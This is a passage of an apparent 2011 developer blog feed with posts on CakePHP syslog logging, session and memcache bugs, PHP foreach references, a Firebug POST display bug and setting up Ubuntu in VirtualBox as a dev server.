&lt;span class=&quot;x&quot;&gt;echo (is_float($bar)) ? &amp;quot;This is a float&amp;quot; : &amp;quot;This is not a float&amp;quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This time I pass a string as a parameter (like example 1) but got a float as a
result (like example 2).&lt;/p&gt;

&lt;p&gt;Well, this time I&amp;#39;m sure that can&amp;#39;t be the correct behavior.&lt;/p&gt;

&lt;h2&gt;How to deal with it&lt;/h2&gt;

&lt;p&gt;I finally wrote a little wrapper for json_decode to handle those strange cases
:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function my_json_decode($var) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $decodedValue = json_decode($var, true);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  return is_array($decodedValue) ? $decodedValue : $var;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will check that the result of the JSON decoding is an array, and if not
(meaning the original string was not a JSON string), it will return the
original string.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Custom logging system for cakePHP</title>
   <link href="http://blog.pixelastic.com/2011/05/05/custom-logging-system-cakephp/"/>
   <updated>2011-05-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/05/05/custom-logging-system-cakephp</id>
   <content type="html">&lt;p&gt;I do love cakePHP, but sometimes it can get tricky to get it to do exactly
what you want.&lt;/p&gt;

&lt;p&gt;For our big app, we needed to stop using the builtin logging system to take
advantage of the syslog and log analyzer tools we had.&lt;/p&gt;

&lt;p&gt;At first I got confused by the various log files, but after reading the cake
core code, it (kinda) makes sense. Let me explain it to you.&lt;/p&gt;

&lt;h2&gt;CakeLog and FileLog&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;CakeLog&lt;/code&gt;is the cake static class that handles all the log actions. You can
call it yourself statically using &lt;code&gt;CakeLog::write()&lt;/code&gt;, but cake also calls it
itself when an error is reported.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;CakeLog&lt;/code&gt;internally write its content using the FileLog. This &lt;code&gt;FileLog
&lt;/code&gt;writes its content to files located in &lt;code&gt;app/tmp/logs&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;Writing errors to the syslog instead&lt;/h2&gt;

&lt;p&gt;We didn&amp;#39;t want our logs to be saved in &lt;code&gt;app/tmp/logs&lt;/code&gt; for three mains reasons
:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Those files gets deleted on every deploy we did (this was how our deployment system works)&lt;/li&gt;
&lt;li&gt;Those files can get very big very fast&lt;/li&gt;
&lt;li&gt;Our app was distributed accross several servers, meaning that each server had its own set of log files&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Instead, we wanted them to be written to the syslog where they would be
intercepted and stored in our main log analyzer.&lt;/p&gt;

&lt;p&gt;To do so, we wrote a simple &lt;code&gt;SysLog&lt;/code&gt;class to use instead of the &lt;code&gt;FileLog&lt;/code&gt;.
Here it is :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;class SysLog {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  /**&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  *Â Â Â  Writes a log to the syslog&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  *Â Â Â  \paramÂ Â Â  $typeÂ Â Â  Either a numerical constant or a string&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  *Â Â Â  \paramÂ Â Â  $messageÂ Â Â  Message to log&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  **/&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  public function write($type, $message) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    // We &amp;quot;fix&amp;quot; CakeLog that passes severity as a string&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    if (is_string($type)) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      // Mapping string to syslog priorities&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      $priorities = array(&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;#39;debug&amp;#39;Â Â Â  =&amp;gt; LOG_DEBUG,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;#39;info&amp;#39;Â Â Â  Â Â Â  =&amp;gt; LOG_INFO,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;#39;notice&amp;#39;Â Â Â  =&amp;gt; LOG_NOTICE,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;#39;warning&amp;#39;Â Â Â  =&amp;gt; LOG_WARNING,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;#39;error&amp;#39;Â Â Â  =&amp;gt; LOG_ERR,&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;        &amp;#39;default&amp;#39;Â Â Â  =&amp;gt; LOG_NOTICE&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      );&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;      $type = (array_key_exists($type, $priorities)) ? $priorities[$type] : $priorities[&amp;#39;default&amp;#39;];&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    // Writing to syslog&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    openlog(false, 0, LOG_LOCAL7);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    syslog($type, trim($message));&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    closelog();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Place this file in &lt;code&gt;app/lib/log/sys_log.php&lt;/code&gt;. Then, in
&lt;code&gt;app/config/bootstrap.php&lt;/code&gt;, place the following code :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;CakeLog::config(&amp;#39;default&amp;#39;, array(&amp;#39;engine&amp;#39; =&amp;gt; &amp;#39;SysLog&amp;#39;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It is important that you place the &lt;code&gt;CakeLog::config()&lt;/code&gt; call in&lt;code&gt;bootstrap.php&lt;/code&gt;
and not in &lt;code&gt;core.php&lt;/code&gt; because of the way cake actually loads its internal. I
also manually defined the syslog facility as LOCAL7, but you can change it to
whatever you want or even update the code so the actual facility can be passed
as a parameter of the &lt;code&gt;CakeLog::config()&lt;/code&gt; call (actually, that&amp;#39;s how it&amp;#39;s done
in my real code, but I didn&amp;#39;t want to overcomplicate the example).&lt;/p&gt;

&lt;p&gt;Also, note that I added a special code to handle the way CakeLog passes
parameters to the SysLog. CakeLog passes the severity as a string, so we
convert it back to the PHP constants.&lt;/p&gt;

&lt;p&gt;With this code, all your logs will now be routed to the syslog, and your
&lt;code&gt;app/tmp/logs&lt;/code&gt; directory will no longer grow in size (instead, that will be
your &lt;code&gt;/var/logs/syslog&lt;/code&gt; :) )&lt;/p&gt;

&lt;h2&gt;Where are my errors loggued now ?&lt;/h2&gt;

&lt;p&gt;Well, your errors are loggued to the syslog. But cake defines its own error
handler that will reformat the error thrown by PHP, and reroute it to the
&lt;code&gt;CakeLog&lt;/code&gt;. In effect, it means that all errors with similar severity will be
grouped (&lt;code&gt;E_PARSE&lt;/code&gt;, &lt;code&gt;E_ERROR&lt;/code&gt;, &lt;code&gt;E_CORE_ERROR&lt;/code&gt;, etc will be loggued as&lt;code&gt;
LOG_ERROR&lt;/code&gt;). Also, cake will parse and reformat the message to log. It can be
problematic if you rely on your PHP config to correctly parse your logs
because you won&amp;#39;t have the expected output.&lt;/p&gt;

&lt;p&gt;Hopefully, cake provides a way to disable this error handler, but it was very
tricky to find and even more tricky to correctly use. I won&amp;#39;t spend too much
time on all the details, but what you have to know is :&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;You have to define a &lt;code&gt;define(&amp;#39;DISABLE_DEFAULT_ERROR_HANDLING&amp;#39;, true);&lt;/code&gt; in order to disable the cake error handler and use the default PHP one&lt;/li&gt;
&lt;li&gt;This call MUST be done before your &lt;code&gt;Configure::write(&amp;#39;debug&amp;#39;)&lt;/code&gt; call otherwise it won&amp;#39;t work&lt;/li&gt;
&lt;li&gt;You also have to define a &lt;code&gt;Configure::write(&amp;#39;log&amp;#39;, E_ALL &amp;amp; ~E_DEPRECATED);&lt;/code&gt; for this to work but...&lt;/li&gt;
&lt;li&gt;You can&amp;#39;t define both the debug and the log value in the same call using an array, you have to define them in two different calls &lt;code&gt;debug&lt;/code&gt;then &lt;code&gt;log&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So, finally, here is the final working configuration :&lt;/p&gt;

&lt;p&gt;In &lt;code&gt;app/config/core.ph&lt;/code&gt;p :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;Configure::write(&amp;#39;log&amp;#39;, E_ALL &amp;amp; ~E_DEPRECATED);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;define(&amp;#39;DISABLE_DEFAULT_ERROR_HANDLING&amp;#39;, true);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And in&lt;code&gt;app/config/bootstrap.php&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;CakeLog::config(&amp;#39;default&amp;#39;, array(&amp;#39;engine&amp;#39; =&amp;gt; &amp;#39;SysLog&amp;#39;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Final words&lt;/h2&gt;

&lt;p&gt;I wrote this blog post because I got hit by this problem. Twice. I didn&amp;#39;t
bloggued about it the first time, so a few weeks later when I had to change
some config values in my bootstrap.php and core.php I forgot about the
specific order of loading things. It took me a couple hours to figure it out
again.&lt;/p&gt;

&lt;p&gt;So, to avoid running into the same issue some months from now, I took some
time to write it down, and hopefully I&amp;#39;ll help some of you too.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Parsing error in cakePHP view for empty file</title>
   <link href="http://blog.pixelastic.com/2011/04/20/parsing-error-cakephp-view-empty-file/"/>
   <updated>2011-04-20T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/04/20/parsing-error-cakephp-view-empty-file</id>
   <content type="html">&lt;p&gt;As a convention, I never write the closing PHP tag at the end of my php files.
It helps in avoiding the &amp;quot;header already sent&amp;quot; error when dealing with
cookie/sessions.&lt;/p&gt;

&lt;p&gt;However, today cake complains about&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;Parse error: syntax error, unexpected $end in /var/www/website/app/views/players/default.ctp on line 1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;My &lt;code&gt;default.ctp file&lt;/code&gt; only contain the following content :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It took me a couple of minutes to fix it. I only added an empty line after the
opening tag, so it now read :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The first statement was a perfectly valid php file, but somehow it makes
cakePHP fail.&lt;/p&gt;

&lt;p&gt;I didn&amp;#39;t have time to investigate on it further, nor submit a bug report
(because it may well be coming from my custom app, not cake itself) but I plan
to.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Losing session on each request with cakePHP and Chrome</title>
   <link href="http://blog.pixelastic.com/2011/04/13/losing-session-request-cakephp-chrome/"/>
   <updated>2011-04-13T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/04/13/losing-session-request-cakephp-chrome</id>
   <content type="html">&lt;p&gt;I finally found solution for one of the more tenacious bug I ever encountered.
Share the joy !&lt;/p&gt;

&lt;p&gt;I had a website working perfectly under Firefox but when browsing using
Chrome, I noticed that my Session gets regenerated on each page load.
&lt;strong&gt;Constantly&lt;/strong&gt;. Creating hundred and hundred of useless session files.&lt;/p&gt;

&lt;h2&gt;And only with Chrome.&lt;/h2&gt;

&lt;p&gt;Since when using a browser should change the server behavior ? Well I don&amp;#39;t
exactly know what Chrome is doing with the &lt;code&gt;referer&lt;/code&gt; but it seems that it is
altering it in some ways.&lt;/p&gt;

&lt;p&gt;And cakePHP forces the setting of &lt;code&gt;session.referer_check&lt;/code&gt; to &lt;code&gt;true&lt;/code&gt;, thus
checking that multiple requests with the same PHPSESSID comes from the same
url.&lt;/p&gt;

&lt;p&gt;As one posted on php.net :&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;If you have a value specified for session.referer&lt;em&gt;check you may run into
difficulty when someone accesses your site and attempts to log in with a mis-
capitalized URL.Â  The logon will fail because any calls to session&lt;/em&gt;start()
will result in the existing session being trashed and a new one being created.
This becomes a bigger problem when the logon is followed by a
header(&amp;quot;Location: ...&amp;quot;) redirect, because the session_start() at the top of
the page will fail.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Those two settings combined, and you got a hell of a mess. I first found a
quick fix by forcing the setting of &lt;code&gt;session_start()&lt;/code&gt; in
&lt;code&gt;app/webroot/index.php&lt;/code&gt;. But after more &lt;a href=&quot;http://www.nirvaat.com/blog%0A/web-development/session-issue-in-iis-with-cakephp/&quot;&gt;reading &lt;/a&gt;and &lt;a href=&quot;http://freetofeel.com/page15/&quot;&gt;debugging
&lt;/a&gt;I finally found the culprit.&lt;/p&gt;

&lt;h2&gt;Hacking your way through the fix&lt;/h2&gt;

&lt;p&gt;There is no easy way to prevent cake from setting this setting, but you can
define your own session handler in the &lt;code&gt;Session.save&lt;/code&gt; configure key.&lt;/p&gt;

&lt;p&gt;Just create file namedÂ &lt;code&gt;session_custom.php&lt;/code&gt; in &lt;code&gt;app/config/&lt;/code&gt; and set
&lt;code&gt;Configure::write(&amp;#39;Session.save&amp;#39;, &amp;#39;session_custom&amp;#39;);&lt;/code&gt; in your &lt;code&gt;core.php&lt;/code&gt; file.&lt;/p&gt;

&lt;p&gt;And in that file, just drop the following lines (copy/paste from
&lt;code&gt;cake_session.php&lt;/code&gt;)&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;ini_set(&amp;#39;session.referer_check&amp;#39;, &amp;#39;&amp;#39;);Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  // Killing this f***ing config that was causing so much trouble with Chrome&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;ini_set(&amp;#39;session.use_trans_sid&amp;#39;, 0);Â Â Â  Â Â Â  Â Â Â  Â Â Â  Â Â Â  // No session id in url&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;ini_set(&amp;#39;session.name&amp;#39;, Configure::read(&amp;#39;Session.cookie&amp;#39;));Â Â Â  // Using custom cookie name instead of PHPSESSID&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;ini_set(&amp;#39;session.cookie_lifetime&amp;#39;, $this-&amp;gt;cookieLifeTime);Â Â Â  // Cookie like time, depending on security level&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;ini_set(&amp;#39;session.cookie_path&amp;#39;, $this-&amp;gt;path);Â Â Â  Â Â Â  Â Â Â  Â Â Â  // Cookie path&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>Memcache keys not getting saved correctly</title>
   <link href="http://blog.pixelastic.com/2011/04/08/memcache-keys-save-correctly/"/>
   <updated>2011-04-08T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/04/08/memcache-keys-save-correctly</id>
   <content type="html">&lt;p&gt;&lt;em&gt;Update : We were initially blaming Memcache not correctly setting/getting
keys. We should instead have blamed him for being over-zealous in clearing its
list. See bottom of post for details.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Today we were having a bit of an issue with memcache. We had to write a
thousand keys into it, reading them from a JSON file.&lt;/p&gt;

&lt;p&gt;This code had been running happily on our server for the past two weeks. But
as the number of keys increased, we came to spot that some keys seemed to be
randomly cleared.&lt;/p&gt;

&lt;p&gt;After further investigation (and a lot of hours), it appears that the keys
were simply not set at all, or set to an empty/false value. This was really
strange because it occured inside a loop on our JSON file, and never occurs
for the same keys, nor everytime.&lt;/p&gt;

&lt;p&gt;We took our server under high stress, forcing it to reload data very often, to
trigger the bug once more. After a lot of test, we gather some more data, but
nothing really came out. The missed keys were really random.&lt;/p&gt;

&lt;p&gt;Finally, we decided to code a fast and dirty fix, until we found a better
solution. Basically, we simply checks that the value is correctly saved after
saving it, and if not, we retry. And we do so recursively.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;function set($key, $val, $recursionLevel = 0) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  Cache::write($key, $val);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  if (Cache::read($key)===false) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    if ($recursionLevel&amp;gt;10) die(&amp;#39;Possible infinite recursion);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;    $this-&amp;gt;set($key, $val, $recursionLevel);&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  }&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note, that this will not work if one of your values is defined as false,
otherwise you&amp;#39;ll end up in an infinite loop.&lt;/p&gt;

&lt;h2&gt;Update&lt;/h2&gt;

&lt;p&gt;Well, the problem kept sporadically popping. And we finally found the REAL
culprit.&lt;/p&gt;

&lt;p&gt;Cake provides multiple &lt;code&gt;Cache&lt;/code&gt;config, using different settings. One would use
a special config to set different cache duration. Each setting would use a
different key prefix.&lt;/p&gt;

&lt;p&gt;Unfortunatly, memcache has no way of finding keys starting with a special
prefix. So when we do a &lt;code&gt;Cache::clear()&lt;/code&gt;, it just wipes clear the whole
memcache keys, no matter what config you specify.&lt;/p&gt;

&lt;p&gt;We were running two different websites using the same memcache server, and
when doing a clear on one website, it cleared keys on the second one as well.&lt;/p&gt;

&lt;p&gt;We finally started one memcache server per site.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Multiple foreach() with references in php</title>
   <link href="http://blog.pixelastic.com/2011/04/05/multiple-foreach-references-php/"/>
   <updated>2011-04-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/04/05/multiple-foreach-references-php</id>
   <content type="html">&lt;p&gt;It took me a couple of hours to debug : I had an array with values that
shouldn&amp;#39;t be here, values from another part of the application, and I couldn&amp;#39;t
figure out where that came from.&lt;/p&gt;

&lt;p&gt;Well, it turns it was part of a documented feature of PHP :&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Unless the array is referenced, foreach operates on a copy of the specified
array and not the array itself. foreach has some side effects on the array
pointer. Don&amp;#39;t rely on the array pointer during or after the foreach without
resetting it. Reference of a $value and the last array element remain even
after the foreach loop. It is recommended to destroy it by unset().php.net&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;My code was as simple as :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;$newArray = array();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$newArray2 = array();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;foreach($list as $key =&amp;gt; &amp;amp;$data) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $newArray[] = $data;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;foreach($list2 as $key =&amp;gt; &amp;amp;$data) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;  $newArray2[] = $data;&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This resulted in the latest index of &lt;code&gt;$newArray&lt;/code&gt; being set to one of &lt;code&gt;$list2&lt;/code&gt;
values (didn&amp;#39;t know exactly which). This is really counter intuitive.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Firebug 1.7 moving headers to raw POST source</title>
   <link href="http://blog.pixelastic.com/2011/04/04/firebug-1-7-moving-headers-raw-post-source/"/>
   <updated>2011-04-04T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/04/04/firebug-1-7-moving-headers-raw-post-source</id>
   <content type="html">&lt;p&gt;&lt;em&gt;Edit : The issue discussed here has been fixed in &lt;a href=&quot;http://getfirebug.com/releases/firebug/1.9/firebug-1.9.0a2.xpi&quot;&gt;Firebug
1.9a2&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It took me a whole day to track this bug down. At first I thought something
was wrong in my request, I tried to replay it using Firebug and I kept hitting
a &amp;quot;malformed request&amp;quot; error.&lt;/p&gt;

&lt;p&gt;Debugging it in reverse order, using Wireshark and other tools I finally came
to the conclusion that my request was indeed valid.&lt;/p&gt;

&lt;h2&gt;So what ?&lt;/h2&gt;

&lt;p&gt;The guilty part was indeed Firebug. When I ran a simple &lt;code&gt;POST&lt;/code&gt; request from
Flash, and inspect it from Firebug, I could spot that no &lt;code&gt;Content-Length&lt;/code&gt; nor
&lt;code&gt;Content-Type&lt;/code&gt; headers were displayed in the &amp;quot;Headers&amp;quot; part. I then saw that
the &amp;quot;source&amp;quot; part of the &lt;code&gt;POST&lt;/code&gt;tab contains my missing headers. What was that
?&lt;/p&gt;

&lt;p&gt;HTTP POST Request are supposed to be split into two parts. First part are the
headers, each separated by a &lt;code&gt;\r\n&lt;/code&gt;. Then, after and empty line was the &lt;code&gt;POST
&lt;/code&gt;raw content. Seeing that my headers gets mixed up with the &lt;code&gt;POST&lt;/code&gt;data I
thought that the request was malformed and a &lt;code&gt;\r\n&lt;/code&gt; was added too early.&lt;/p&gt;

&lt;p&gt;I checked with Wireshark and with PHP on the back end, and no, the request was
indeed absolutly valid. Wireshark did not show any &lt;code&gt;\r\n&lt;/code&gt; that shouldn&amp;#39;t be
there and PHP correctly parsed my request. The only issue was the details
displayed by Firebug.&lt;/p&gt;

&lt;h2&gt;So it&amp;#39;s a display bug ? I can live with it.&lt;/h2&gt;

&lt;p&gt;Well, actually, it&amp;#39;s a little more than just a display bug. It kind of blocks
my usual debugging workflow.&lt;/p&gt;

&lt;p&gt;To debug an XHR request, I don&amp;#39;t usually restart the whole page request just
to debug one of the inner request.&lt;/p&gt;

&lt;p&gt;The Firebug ability to &amp;quot;open request in new tab&amp;quot; is a time saver for me. I can
play and replay the same request over and over until it&amp;#39;s debuggued.&lt;/p&gt;

&lt;p&gt;But with this bug, I can&amp;#39;t use this feature. Opening the request in new tab
will not send the slipped headers, and will instead send them in the &lt;code&gt;POST
&lt;/code&gt;source, resulting in a corrupted posted data.&lt;/p&gt;

&lt;p&gt;I&amp;#39;ve &lt;a href=&quot;http://code.google.com/p/fbug/issues/detail?id=4327&quot;&gt;posted an issue&lt;/a&gt; on
the Firebug bug tracker. I hope it will get resolved soon. Until then, I&amp;#39;m
using Live HTTP Headers to capture and replay the requests I need to debug.&lt;/p&gt;

&lt;h2&gt;Update&lt;/h2&gt;

&lt;p&gt;Seems like the bug come from Firefox internals and not Firebug. More details
&lt;a href=&quot;http://groups.google.com/group/mozilla.dev.platform/browse_thr%0Aead/thread/1faabb0d0a8d26f7?hl=en&quot;&gt;on this post.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Edit : Seems to be &lt;a href=&quot;https://bugzilla.mozilla.org/show_bug.cgi?id=649338&quot;&gt;resolved in
Firefox&lt;/a&gt;, will be
available in next release (8.0 I guess).&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Installing Ubuntu in VirtualBox to work as a development server</title>
   <link href="http://blog.pixelastic.com/2011/03/31/installing-ubuntu-virtualbox-work-development-server/"/>
   <updated>2011-03-31T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2011/03/31/installing-ubuntu-virtualbox-work-development-server</id>
   <content type="html">&lt;p&gt;I was tired of trying to install Lighttpd on Windows (hint : don&amp;#39;t try, it&amp;#39;s a
mess. I found no way to get vhosts and php as cgi at the same time). So I
finally decided that Linux was the way to go.&lt;/p&gt;

&lt;p&gt;I have always developped using Windows, and even if I&amp;#39;m slowly migrating to
Ubuntu at home, I&amp;#39;m still using Windows 7 at work. The solution that best fits
me was still using my Windows environment for coding, but using Ubuntu inside
a VM to act as a server.&lt;/p&gt;

&lt;p&gt;Let&amp;#39;s see how I did that :&lt;/p&gt;

&lt;h2&gt;Required components&lt;/h2&gt;

&lt;p&gt;First, let&amp;#39;s clarify what I&amp;#39;ll have to install for this project : Lighttpd as
the webserver, mysql and memcached for storing data and php5 to run cakePHP.&lt;/p&gt;

&lt;h2&gt;Step One : Running Ubuntu inside a VM&lt;/h2&gt;

&lt;p&gt;Start by downloading the &lt;a href=&quot;http://www.ubuntu.com/business/get-%0Aubuntu/download&quot;&gt;Ubuntu iso&lt;/a&gt; (i&amp;#39;s 687Mo, you&amp;#39;d better start this download first). I
personnaly used the 10.04 Desktop version (I tried the 10.10 Server version
first but I feel more confident with a UI).&lt;/p&gt;

&lt;p&gt;Then, download &lt;a href=&quot;http://www.virtualbox.org/wiki/Downloads&quot;&gt;the latest VirtualBox version
&lt;/a&gt;(4.0.4 at the time of this
writing).&lt;/p&gt;

&lt;p&gt;And mount the iso in VirtualBox and start the install. This is pretty easy and
you should be done in 10mn. Once the install is finished, you&amp;#39;ll be prompted
to reboot. Do not reboot just now. Instead, shutdown your guest machine (you
can type &lt;code&gt;sudo halt&lt;/code&gt; if the GUI does not work).&lt;/p&gt;

&lt;p&gt;Once back in Windows, go to your VM config and unmount the install iso,
otherwise the install procedure will be started again everytime you load your
VM.&lt;/p&gt;

&lt;p&gt;Once it&amp;#39;s done, you can reboot the gues and once loaded, select the in
VirtualBox Menu =&amp;gt; Devices =&amp;gt; Install guest additions. The next popup can take
some long minutes to show, so be patient. This will install the guest
additions that will allow you to easily communicate between the guest and host
machines.&lt;/p&gt;

&lt;p&gt;Once installed, reboot once more, and you should have the guest addition image
sitting on your desktop.&lt;/p&gt;

&lt;p&gt;Start a terminal and install the guest additions by doing :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /media/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;name of your VBOX image&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
./autorun.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This will finish the guest addition installation. Reboot your guest machine
one last time and you&amp;#39;ll be ready for step 2.&lt;/p&gt;

&lt;h2&gt;Step 2 : Installing the server stuff&lt;/h2&gt;

&lt;p&gt;We will now install the various components we&amp;#39;ll need. You could probably
install them all with one command but I&amp;#39;ll split them in different line so
you&amp;#39;ll correctly see what&amp;#39;s installed.&lt;/p&gt;

&lt;p&gt;First, lighttpd :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo apt-get install lighttpd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, memcached&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo apt-get install memcached
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And mysql server. This one will prompt you to enter the root password you&amp;#39;ll
want.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;sudo apt-get install mysql-server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
